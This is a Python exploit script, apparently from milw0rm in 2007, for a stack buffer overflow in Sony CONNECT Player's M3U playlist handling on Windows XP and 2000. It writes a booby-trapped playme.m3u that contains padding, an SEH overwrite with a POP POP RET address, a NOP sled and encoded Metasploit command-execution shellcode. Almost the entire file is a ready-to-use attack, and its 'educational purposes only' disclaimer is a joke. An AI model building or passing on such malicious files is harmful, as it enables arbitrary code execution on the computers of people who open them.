#!/usr/bin/python
#Secunia Advisory : SA27270 
#Release Date : 2007-10-29
# Sony CONNECT Player M3U Playlist Processing Stack Buffer Overflow (m3u File) Local Exploit
# Bug discovered by  Parvez Anwar
# Exploit Written by TaMBaRuS (tambarus@gmail.com)
# Tested on:  Sony CONNECT Player (SonicStage) 4.x installed on Windows XP SP2/ 2k SP4
# Shellcode: Windows Execute Command <metasploit.com>
# Eductional Purposes only  ;) 
##

from struct import pack

m3u = ("#EXTM3U\nhttp://%s")

shellcode = (
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
"\x42\x30\x42\x50\x42\x50\x4b\x58\x45\x44\x4e\x33\x4b\x48\x4e\x57"
"\x45\x50\x4a\x57\x41\x30\x4f\x4e\x4b\x38\x4f\x34\x4a\x31\x4b\x58"
"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x54\x4b\x38\x46\x43\x4b\x58"
"\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x35\x46\x42\x46\x30\x45\x57\x45\x4e\x4b\x38"
"\x4f\x45\x46\x52\x41\x50\x4b\x4e\x48\x56\x4b\x48\x4e\x50\x4b\x54"
"\x4b\x48\x4f\x45\x4e\x51\x41\x30\x4b\x4e\x4b\x58\x4e\x51\x4b\x48"
"\x41\x50\x4b\x4e\x49\x58\x4e\x55\x46\x52\x46\x50\x43\x4c\x41\x53"
"\x42\x4c\x46\x56\x4b\x38\x42\x34\x42\x33\x45\x38\x42\x4c\x4a\x47"
"\x4e\x50\x4b\x38\x42\x44\x4e\x50\x4b\x38\x42\x47\x4e\x41\x4d\x4a"
"\x4b\x48\x4a\x56\x4a\x30\x4b\x4e\x49\x30\x4b\x48\x42\x48\x42\x4b"
"\x42\x50\x42\x30\x42\x50\x4b\x38\x4a\x36\x4e\x43\x4f\x35\x41\x43"
"\x48\x4f\x42\x56\x48\x55\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x57"
"\x42\x35\x4a\x56\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x56\x4a\x49"
"\x50\x4f\x4c\x38\x50\x30\x47\x55\x4f\x4f\x47\x4e\x43\x46\x41\x36")

NEXT_SEH_RECORD = 0x909006EB  # JMP SHORT + 0x06
SE_HANDLER = 0x7CEA53D2       # POP POP RET (SHELL32.DLL/2k SP4)

buf = "PLAY ME"
buf += "\x3e" * 1062
buf += pack("<L", NEXT_SEH_RECORD)
buf += pack("<L", SE_HANDLER)
buf += "\x90" * 90
buf += shellcode

m3u %= buf

fd = open("playme.m3u", "w")
fd.write(m3u)
fd.close()

print "DONE"

# EoF

# milw0rm.com [2007-10-29]